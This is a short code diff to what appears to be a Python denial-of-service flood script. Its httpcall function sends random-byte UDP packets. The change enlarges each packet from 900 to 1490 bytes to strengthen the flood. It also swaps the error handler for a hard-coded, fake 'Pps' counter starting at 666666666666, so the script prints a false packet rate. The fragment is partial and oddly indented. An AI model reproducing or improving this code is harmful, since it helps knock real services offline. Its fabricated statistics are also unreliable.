@@ -80,7 +80,7 @@ def httpcall(url):
 	referer_list()
 	code=0
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	bytes = random._urandom(900)
+	bytes = random._urandom(1490)
 	try:
 		
 			
@@ -88,8 +88,9 @@ def httpcall(url):
 			s.recv(1024)
 	except socket.error as e:
 			#print e.code
-			set_flag(1)
-			print 'Response Code 500'
+			sent = 666666666666
+			sent += 1
+			print 'Pps: %s' % sent
 			code=500
 	else:
 			inc_counter()
